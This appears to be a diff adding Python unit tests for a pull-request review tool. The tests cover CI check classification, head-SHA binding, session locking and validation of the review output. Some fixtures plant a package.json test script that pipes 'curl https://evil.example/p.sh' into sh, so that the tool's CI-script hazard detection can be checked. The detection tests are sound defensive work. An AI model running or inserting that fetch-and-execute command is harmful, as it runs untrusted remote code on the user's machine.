@@ -1614,6 +1614,552 @@ class TestPr3MajorRegressions(unittest.TestCase):
                     self.assertEqual(leaked, [], f"Internal comparison keys leaked to gate_state.json: {leaked}")
             self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir_m3)], env=env)[0], 0)
 
+    def test_r3_m1_m4_m5_m6_workflow_lint_live_head_binding_and_pytest_collect(self) -> None:
+        # R3-M1: lint-only job inside a Tests workflow must NOT revoke --skip-test or confirm gh_test_passed
+        for non_test_name, non_test_wf in (
+            ("eslint", "Tests"),
+            ("Tests / eslint", ""),
+            ("Tests / eslint", "Tests"),
+            ("tests-caller / eslint", "Tests"),
+            ("Tests/eslint", ""),
+            ("Tests / eslint (src / app)", ""),
+        ):
+            self.assertFalse(
+                _lib.is_potential_test_check(non_test_name, non_test_wf),
+                f"Expected non-test check: name={non_test_name!r}, wf={non_test_wf!r}",
+            )
+        for test_name, test_wf in (
+            ("Python 3.12", "Tests"),
+            ("unit-tests", "Tests"),
+            ("test (a / docker)", ""),
+            ("Tests/Python 3.12", ""),
+        ):
+            self.assertTrue(
+                _lib.is_potential_test_check(test_name, test_wf),
+                f"Expected test check: name={test_name!r}, wf={test_wf!r}",
+            )
+        self.assertEqual(
+            _lib.find_stage2_test_failures(
+                [
+                    {
+                        "tool": "gh_pr_checks",
+                        "status": "failed",
+                        "check_entries": [
+                            {"name": "unit-tests", "workflow": "Tests", "status": "passed"},
+                            {"name": "eslint", "workflow": "Tests", "status": "failed"},
+                            {"name": "tests-caller / eslint", "workflow": "Tests", "status": "failed"},
+                        ],
+                    }
+                ]
+            ),
+            [],
+        )
+        st_lint_only_wf, _ = _lib.evaluate_skip_test_stage2_status(
+            {
+                "skip_test": True,
+                "skip_test_revoked": False,
+                "stage1": {"status": "NG", "bypassed_by_skip_test": True},
+                "stage2": {
+                    "executed": True,
+                    "checks": [
+                        {"tool": "test", "status": "blocked_fork"},
+                        {
+                            "tool": "gh_pr_checks",
+                            "status": "passed",
+                            "check_entries": [
+                                {"name": "eslint", "workflow": "Tests", "status": "passed"},
+                                {"name": "tests-caller / eslint", "workflow": "Tests", "status": "passed"},
+                                {"name": "Tests/eslint", "workflow": "", "status": "passed"},
+                                {"name": "Tests / eslint (src / app)", "workflow": "", "status": "passed"},
+                            ],
+                        },
+                    ],
+                },
+            }
+        )
+        self.assertEqual(st_lint_only_wf, "unverified")
+
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            wd = root / "wd"
+            wd.mkdir()
+
+            # R3-M6: pytest_collect: IDs must compare diagnostics (both -q real output and summary - detail output)
+            py_col_base = (
+                "_________________ ERROR collecting tests/test_app.py _________________\n"
+                "tests/test_app.py:2: in <module>\n"
+                "    from src.app import run\n"
+                "E   ModuleNotFoundError: No module named 'src'\n"
+                "=========================== short test summary info ============================\n"
+                "ERROR tests/test_app.py\n"
+                "1 error in 0.12s\n"
+            )
+            py_col_head_diff = (
+                "_________________ ERROR collecting tests/test_app.py _________________\n"
+                f'E     File "{wd}/tests/test_app.py", line 1\n'
+                "E       def broken(\n"
+                "E                  ^\n"
+                "E   SyntaxError: '(' was never closed\n"
+                "=========================== short test summary info ============================\n"
+                "ERROR tests/test_app.py\n"
+                "1 error in 0.15s\n"
+            )
+            py_col_head_same = (
+                "_________________ ERROR collecting tests/test_app.py _________________\n"
+                "tests/test_app.py:2: in <module>\n"
+                "    from src.app import run\n"
+                "E   ModuleNotFoundError: No module named 'src'\n"
+                "=========================== short test summary info ============================\n"
+                "ERROR tests/test_app.py\n"
+                "1 error in 0.29s\n"
+            )
+            cb_ids, cb_cnt = run_checks.extract_failure_signature(py_col_base, wd)
+            ch_diff_ids, ch_diff_cnt = run_checks.extract_failure_signature(py_col_head_diff, wd)
+            ch_same_ids, ch_same_cnt = run_checks.extract_failure_signature(py_col_head_same, wd)
+            self.assertEqual(cb_ids, ["pytest_collect:tests/test_app.py"])
+            self.assertEqual(ch_diff_ids, ["pytest_collect:tests/test_app.py"])
+
+            origin_col_diff, _, _ = run_checks._classify_head_vs_base_failure(
+                {
+                    "failed_tests": ch_diff_ids,
+                    "failure_count": ch_diff_cnt,
+                    "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(py_col_head_diff, wd),
+                },
+                {
+                    "failed_tests": cb_ids,
+                    "failure_count": cb_cnt,
+                    "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(py_col_base, wd),
+                },
+            )
+            self.assertEqual(origin_col_diff, "regression")
+
+            origin_col_same, _, _ = run_checks._classify_head_vs_base_failure(
+                {
+                    "failed_tests": ch_same_ids,
+                    "failure_count": ch_same_cnt,
+                    "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(py_col_head_same, wd),
+                },
+                {
+                    "failed_tests": cb_ids,
+                    "failure_count": cb_cnt,
+                    "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(py_col_base, wd),
+                },
+            )
+            self.assertEqual(origin_col_same, "preexisting")
+
+            # R3-M4 & R3-M5: Live --pr checks must stay bound to session head_sha and never confirm from stale prepare snapshot
+            sess_root = root / "sessions"
+            repo = root / "repo_live_r3"
+            init_git_repo(repo)
+            (repo / "src").mkdir()
+            (repo / "src" / "app.py").write_text("def run() -> int:\n    return 1\n", encoding="utf-8")
+            base_sha = git_commit_all(repo, "base")
+            run_git(repo, ["checkout", "-b", "pr-r3"])
+            (repo / "src" / "app.py").write_text("def run() -> int:\n    return 2\n", encoding="utf-8")
+            head_a = git_commit_all(repo, "commit A")
+            (repo / "src" / "app.py").write_text("def run() -> int:\n    return 3\n", encoding="utf-8")
+            head_b = git_commit_all(repo, "commit B")
+            run_git(repo, ["reset", "--hard", head_a])
+
+            stub_bin = root / "gh_bin"
+            stub_bin.mkdir()
+            view_state_file = stub_bin / "view_state.json"
+            checks_state_file = stub_bin / "checks_state.json"
+            view_state_file.write_text(
+                json.dumps(
+                    {
+                        "number": 3001,
+                        "title": "PR 3001",
+                        "body": "",
+                        "baseRefName": "main",
+                        "baseRefOid": base_sha,
+                        "headRefName": "pr-r3",
+                        "headRefOid": head_a,
+                        "isCrossRepository": True,
+                        "statusCheckRollup": [
+                            {"name": "unit-tests", "workflowName": "Tests", "status": "COMPLETED", "conclusion": "SUCCESS"}
+                        ],
+                    }
+                ),
+                encoding="utf-8",
+            )
+            checks_state_file.write_text(
+                json.dumps(
+                    {
+                        "rc": 0,
+                        "stdout": json.dumps(
+                            [{"name": "unit-tests", "workflow": "Tests", "bucket": "pass", "state": "SUCCESS"}]
+                        ),
+                        "stderr": "",
+                    }
+                ),
+                encoding="utf-8",
+            )
+            gh_stub = stub_bin / "gh"
+            gh_stub.write_text(
+                "#!/usr/bin/env python3\n"
+                "import json, pathlib, sys\n"
+                "sys.dont_write_bytecode = True\n"
+                "args = sys.argv[1:]\n"
+                "if args[:2] == ['pr', 'view']:\n"
+                f"    sys.stdout.write(pathlib.Path({str(view_state_file)!r}).read_text(encoding='utf-8'))\n"
+                "    sys.exit(0)\n"
+                "if args[:2] == ['pr', 'checks']:\n"
+                f"    d = json.loads(pathlib.Path({str(checks_state_file)!r}).read_text(encoding='utf-8'))\n"
+                "    sys.stdout.write(str(d.get('stdout', '')))\n"
+                "    sys.stderr.write(str(d.get('stderr', '')))\n"
+                "    sys.exit(int(d.get('rc', 1)))\n"
+                "sys.exit(1)\n",
+                encoding="utf-8",
+            )
+            gh_stub.chmod(gh_stub.stat().st_mode | stat.S_IXUSR)
+            env_live = {
+                "YHARUTO_SESSION_ROOT": str(sess_root),
+                "YOMIYASU_LINT_DISABLE": "1",
+                "PATH": f"{stub_bin}{os.pathsep}{os.environ.get('PATH', '')}",
+            }
+
+            rc_p, prep, _, err_p = run_script(
+                "prepare_worktree.py",
+                ["prepare", "--repo", str(repo), "--pr", "3001", "--skip-test"],
+                env=env_live,
+            )
+            self.assertEqual(rc_p, 0, err_p)
+            sdir = Path(str(prep["session_dir"]))
+            self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir)], env=env_live)[0], 0)
+            self.assertEqual(
+                run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir), "--verdict", "NG", "--gaps-count", "1", "--summary", "gap"], env=env_live)[0],
+                0,
+            )
+
+            # R3-M5a: Live refresh fails auth -> MUST NOT fall back to prepare-time SUCCESS snapshot
+            checks_state_file.write_text(
+                json.dumps({"rc": 1, "stdout": "", "stderr": "not logged into any GitHub hosts"}),
+                encoding="utf-8",
+            )
+            rc_auth, ci_auth, _, _ = run_script("run_checks.py", ["--session", str(sdir)], env=env_live)
+            self.assertEqual(rc_auth, 0)
+            gh_auth = next(c for c in _as_list(ci_auth["checks"]) if isinstance(c, dict) and c.get("tool") == "gh_pr_checks")
+            self.assertEqual(gh_auth["status"], "env_unavailable")
+            self.assertIs(gh_auth.get("refresh_failed"), True)
+            self.assertEqual(ci_auth.get("skip_test_hold_status"), "unverified")
+            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir)], env=env_live)[0], 2)
+
+            # R3-M5b: gh CLI missing from PATH -> MUST NOT fall back to prepare-time SUCCESS snapshot
+            no_gh_bin = root / "no_gh_bin"
+            no_gh_bin.mkdir()
+            for tool_name in ("git", "python3"):
+                resolved_tool = shutil.which(tool_name)
+                if resolved_tool:
+                    (no_gh_bin / tool_name).symlink_to(resolved_tool)
+            env_no_gh = {
+                "YHARUTO_SESSION_ROOT": str(sess_root),
+                "YOMIYASU_LINT_DISABLE": "1",
+                "PATH": str(no_gh_bin),
+            }
+            rc_nogh, ci_nogh, _, _ = run_script("run_checks.py", ["--session", str(sdir)], env=env_no_gh)
+            self.assertEqual(rc_nogh, 0)
+            gh_nogh = next(c for c in _as_list(ci_nogh["checks"]) if isinstance(c, dict) and c.get("tool") == "gh_pr_checks")
+            self.assertEqual(gh_nogh["status"], "env_unavailable")
+            self.assertIs(gh_nogh.get("refresh_failed"), True)
+            self.assertEqual(ci_nogh.get("skip_test_hold_status"), "unverified")
+            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir)], env=env_no_gh)[0], 2)
+
+            # R3-M4: PR advances from head_a to head_b where unit-tests pass -> MUST detect head_sha_mismatch & hold
+            view_state_file.write_text(
+                json.dumps(
+                    {
+                        "number": 3001,
+                        "title": "PR 3001",
+                        "body": "",
+                        "baseRefName": "main",
+                        "baseRefOid": base_sha,
+                        "headRefName": "pr-r3",
+                        "headRefOid": head_b,
+                        "isCrossRepository": True,
+                        "statusCheckRollup": [],
+                    }
+                ),
+                encoding="utf-8",
+            )
+            checks_state_file.write_text(
+                json.dumps(
+                    {
+                        "rc": 0,
+                        "stdout": json.dumps(
+                            [{"name": "unit-tests", "workflow": "Tests", "bucket": "pass", "state": "SUCCESS"}]
+                        ),
+                        "stderr": "",
+                    }
+                ),
+                encoding="utf-8",
+            )
+            rc_mm, ci_mm, _, _ = run_script("run_checks.py", ["--session", str(sdir)], env=env_live)
+            self.assertEqual(rc_mm, 0)
+            gh_mm = next(c for c in _as_list(ci_mm["checks"]) if isinstance(c, dict) and c.get("tool") == "gh_pr_checks")
+            self.assertIs(gh_mm.get("head_sha_mismatch"), True)
+            self.assertEqual(ci_mm.get("skip_test_hold_status"), "unverified")
+            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir)], env=env_live)[0], 2)
+
+            # Unchanged head_a with fresh passing checks still confirms the bypass
+            view_state_file.write_text(
+                json.dumps(
+                    {
+                        "number": 3001,
+                        "title": "PR 3001",
+                        "body": "",
+                        "baseRefName": "main",
+                        "baseRefOid": base_sha,
+                        "headRefName": "pr-r3",
+                        "headRefOid": head_a,
+                        "isCrossRepository": True,
+                        "statusCheckRollup": [],
+                    }
+                ),
+                encoding="utf-8",
+            )
+            rc_ok, ci_ok, _, _ = run_script("run_checks.py", ["--session", str(sdir)], env=env_live)
+            self.assertEqual(rc_ok, 0)
+            self.assertNotIn("skip_test_on_hold", ci_ok)
+            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir)], env=env_live)[0], 0)
+            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir)], env=env_live)[0], 0)
+
+    def test_r3_m2_m3_m7_m8_post_lock_draft_snapshot_missing_session_and_local_hazard(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            sess_root = root / "sessions"
+            env = {"YHARUTO_SESSION_ROOT": str(sess_root), "YOMIYASU_LINT_DISABLE": "1"}
+
+            # R3-M8: --local --since A where worktree restores hazardous CI config removed in A->B
+            # must still flag ci_script_hazard from the unfiltered HEAD->worktree diff!
+            repo_haz = root / "repo_local_haz"
+            init_git_repo(repo_haz)
+            (repo_haz / "src").mkdir()
+            (repo_haz / "src" / "app.py").write_text("x = 1\n", encoding="utf-8")
+            (repo_haz / "package.json").write_text(
+                json.dumps({"name": "haz", "scripts": {"test": "curl https://evil.example/p.sh | sh"}}),
+                encoding="utf-8",
+            )
+            commit_a = git_commit_all(repo_haz, "commit A with hazard")
+            (repo_haz / "src" / "app.py").write_text("x = 2\n", encoding="utf-8")
+            (repo_haz / "package.json").write_text(
+                json.dumps({"name": "haz", "scripts": {"test": "node --version"}}),
+                encoding="utf-8",
+            )
+            git_commit_all(repo_haz, "commit B removes hazard")
+            # Working tree restores commit A's hazardous package.json (cancels out in A->worktree diff!)
+            (repo_haz / "package.json").write_text(
+                json.dumps({"name": "haz", "scripts": {"test": "curl https://evil.example/p.sh | sh"}}),
+                encoding="utf-8",
+            )
+            (repo_haz / "src" / "app.py").write_text("x = 3\n", encoding="utf-8")
+
+            rc_h1, prep_h1, _, err_h1 = run_script(
+                "prepare_worktree.py",
+                ["prepare", "--repo", str(repo_haz), "--local", "--since", commit_a],
+                env=env,
+            )
+            self.assertEqual(rc_h1, 0, err_h1)
+            self.assertIs(prep_h1["ci_script_hazard"], True)
+            self.assertEqual(prep_h1["changed_files"], ["src/app.py"])
+            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(prep_h1["session_dir"])], env=env)[0], 0)
+
+            rc_h2, prep_h2, _, err_h2 = run_script(
+                "prepare_worktree.py",
+                ["prepare", "--repo", str(repo_haz), "--local", "--since", commit_a, "--only-files", "src/app.py"],
+                env=env,
+            )
+            self.assertEqual(rc_h2, 0, err_h2)
+            self.assertIs(prep_h2["ci_script_hazard"], True)
+            self.assertEqual(prep_h2["changed_files"], ["src/app.py"])
+            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(prep_h2["session_dir"])], env=env)[0], 0)
+
+            # Unborn HEAD: staged safe package.json + unstaged hazardous edit must still flag ci_script_hazard
+            repo_unborn_haz = root / "repo_unborn_haz"
+            init_git_repo(repo_unborn_haz)
+            (repo_unborn_haz / "src").mkdir()
+            (repo_unborn_haz / "src" / "app.py").write_text("x = 1\n", encoding="utf-8")
+            (repo_unborn_haz / "package.json").write_text(
+                json.dumps({"name": "unborn", "scripts": {"test": "node --version"}}),
+                encoding="utf-8",
+            )
+            run_git(repo_unborn_haz, ["add", "src/app.py", "package.json"])
+            (repo_unborn_haz / "package.json").write_text(
+                json.dumps({"name": "unborn", "scripts": {"test": "curl https://evil.example/p.sh | sh"}}),
+                encoding="utf-8",
+            )
+            rc_uh, prep_uh, _, err_uh = run_script(
+                "prepare_worktree.py",
+                ["prepare", "--repo", str(repo_unborn_haz), "--local", "--only-files", "src/app.py"],
+                env=env,
+            )
+            self.assertEqual(rc_uh, 0, err_uh)
+            self.assertIs(prep_uh["ci_script_hazard"], True)
+            self.assertEqual(prep_uh["changed_files"], ["src/app.py"])
+            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(prep_uh["session_dir"])], env=env)[0], 0)
+
+            # Setup clean repo for R3-M2, R3-M3, and R3-M7
+            repo = root / "repo_pipeline"
+            init_git_repo(repo)
+            (repo / "src").mkdir()
+            (repo / "tests").mkdir()
+            (repo / "src" / "calc.mjs").write_text("export const v = 1;\n", encoding="utf-8")
+            (repo / "tests" / "calc.test.mjs").write_text(
+                "import test from 'node:test';\nimport assert from 'node:assert/strict';\n"
+                "import { v } from '../src/calc.mjs';\n"
+                "test('ok', () => { assert.equal(v > 0, true); });\n",
+                encoding="utf-8",
+            )
+            (repo / "package.json").write_text(
+                json.dumps({"name": "pipe", "type": "module", "scripts": {"test": "node --test tests/calc.test.mjs"}}),
+                encoding="utf-8",
+            )
+            git_commit_all(repo, "base")
+            run_git(repo, ["checkout", "-b", "pr-pipe"])
+            (repo / "src" / "calc.mjs").write_text("export const v = 2;\n", encoding="utf-8")
+            git_commit_all(repo, "head")
+
+            rc_p, prep, _, _ = run_script(
+                "prepare_worktree.py",
+                ["prepare", "--repo", str(repo), "--range", "main..pr-pipe", "--skip-test"],
+                env=env,
+            )
+            self.assertEqual(rc_p, 0)
+            sdir = Path(str(prep["session_dir"]))
+            self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir)], env=env)[0], 0)
+            self.assertEqual(
+                run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir), "--verdict", "NG", "--gaps-count", "1", "--summary", "gap"], env=env)[0],
+                0,
+            )
+            self.assertEqual(run_script("run_checks.py", ["--session", str(sdir)], env=env)[0], 0)
+            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir)], env=env)[0], 0)
+
+            # R3-M3: Stage 4 seals the exact parsed draft bytes
+            ext_draft = root / "external_draft.json"
+            ext_draft_content = "[]\n"
+            ext_draft.write_text(ext_draft_content, encoding="utf-8")
+            rc_p4, _, _, err_p4 = run_script(
+                "prepare_worktree.py",
+                ["prepare-stage4", "--session", str(sdir), "--draft", str(ext_draft)],
+                env=env,
+            )
+            self.assertEqual(rc_p4, 0, err_p4)
+            st_after_p4 = _lib.read_verified_gate_state(sdir)
+            s4_obj = _as_dict(st_after_p4["stage4"])
+            self.assertEqual(s4_obj["draft_sha256"], _lib.sha256_bytes(ext_draft_content.encode("utf-8")))
+
+            nonce = extract_challenge_nonce(Path(str(prep["adversarial_input_path"])))
+            resp_path = Path(str(prep["adversarial_response_path"]))
+            resp_path.write_text(
+                json.dumps(
+                    {
+                        "challenge_nonce": nonce,
+                        "challenged_findings": [],
+                        "missed_findings": [],
+                        "checked_files": ["src/calc.mjs"],
+                        "audit_notes": "変更された計算モジュールと関連テストを確認しました。",
+                    },
+                    ensure_ascii=False,
+                ),
+                encoding="utf-8",
+            )
+            self.assertEqual(
+                run_script(
+                    "prepare_worktree.py",
+                    ["record-stage4", "--session", str(sdir), "--verifier-mode", "subagent", "--response-file", str(resp_path)],
+                    env=env,
+                )[0],
+                0,
+            )
+
+            # Validate review stored OUTSIDE sdir so we can also test R3-M2 and R3-M7
+            ext_review = root / "outside_review.md"
+            ext_review.write_text(
+                build_clean_full_review(verdict="🟢 Approve", alert_tag="[!TIP]", file_rel="src/calc.mjs", file_label="calc.mjs"),
+                encoding="utf-8",
+            )
+            rc_v, out_v, _, _ = run_script(
+                "validate_review_output.py",
+                ["--session", str(sdir), "--file", str(ext_review)],
+                env=env,
+            )
+            self.assertEqual(rc_v, 0, json.dumps(out_v, ensure_ascii=False))
+
+            # R3-M2: post_pending_review.py holds session_state_lock across final verification AND POST!
+            # Verify via a stub gh that checks non-blocking flock on .gate_state.lock during POST.
+            post_bin = root / "post_gh_bin"
+            post_bin.mkdir()
+            lock_observed = root / "lock_observed.txt"
+            post_gh = post_bin / "gh"
+            post_gh.write_text(
+                "#!/usr/bin/env python3\n"
+                "import fcntl, json, os, pathlib, sys\n"
+                "sys.dont_write_bytecode = True\n"
+                "args = sys.argv[1:]\n"
+                "if 'POST' in args:\n"
+                f"    lock_p = pathlib.Path({str(sdir / '.gate_state.lock')!r})\n"
+                "    fd = os.open(str(lock_p), os.O_RDWR)\n"
+                "    try:\n"
+                "        try:\n"
+                "            fcntl.flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)\n"
+                "            locked = 'UNLOCKED'\n"
+                "            fcntl.flock(fd, fcntl.LOCK_UN)\n"
+                "        except BlockingIOError:\n"
+                "            locked = 'LOCKED'\n"
+                "    finally:\n"
+                "        os.close(fd)\n"
+                f"    pathlib.Path({str(lock_observed)!r}).write_text(locked, encoding='utf-8')\n"
+                "    sys.stdout.write(json.dumps({'id': 999, 'html_url': 'https://example.com/review/999'}))\n"
+                "    sys.exit(0)\n"
+                "if '/user' in args:\n"
+                "    sys.stdout.write('reviewer')\n"
+                "    sys.exit(0)\n"
+                "if any('/reviews' in a for a in args):\n"
+                "    sys.stdout.write('[]')\n"
+                "    sys.exit(0)\n"
+                "sys.exit(1)\n",
+                encoding="utf-8",
+            )
+            post_gh.chmod(post_gh.stat().st_mode | stat.S_IXUSR)
+            env_post = {
+                "YHARUTO_SESSION_ROOT": str(sess_root),
+                "PATH": f"{post_bin}{os.pathsep}{os.environ.get('PATH', '')}",
+            }
+            rc_post, out_post, _, err_post = run_script(
+                "post_pending_review.py",
+                ["--session", str(sdir), "--repo", "example/pipe", "--pr", "10", "--review-md", str(ext_review)],
+                env=env_post,
+            )
+            self.assertEqual(rc_post, 0, err_post)
+            self.assertEqual(out_post["status"], "created_pending")
+            self.assertEqual(lock_observed.read_text(encoding="utf-8"), "LOCKED")
+
+            # R3-M7: If cleanup deletes session_dir during prose lint, --session validation MUST fail (exit 1, passed=False)
+            # and MUST NOT silently return passed=True or recreate the deleted session directory!
+            cleanup_linter = root / "cleanup_during_lint.py"
+            cleanup_linter.write_text(
+                "#!/usr/bin/env python3\n"
+                "import pathlib, shutil, sys\n"
+                "sys.dont_write_bytecode = True\n"
+                f"shutil.rmtree(pathlib.Path({str(sdir)!r}), ignore_errors=True)\n"
+                "sys.stdout.write('[]\\n')\n"
+                "sys.exit(0)\n",
+                encoding="utf-8",
+            )
+            env_lint = {"YHARUTO_SESSION_ROOT": str(sess_root)}
+            rc_v_gone, out_v_gone, _, _ = run_script(
+                "validate_review_output.py",
+                ["--session", str(sdir), "--file", str(ext_review), "--yomiyasu-lint", str(cleanup_linter)],
+                env=env_lint,
+            )
+            self.assertEqual(rc_v_gone, 1, json.dumps(out_v_gone, ensure_ascii=False))
+            self.assertFalse(out_v_gone["passed"])
+            self.assertTrue(
+                any("missing" in str(e).lower() or "disappeared" in str(e).lower() for e in _as_list(out_v_gone["gate_errors"])),
+                f"Expected missing session error in {out_v_gone['gate_errors']}",
+            )
+            self.assertFalse(sdir.exists())
+
 
 if __name__ == "__main__":
     unittest.main()
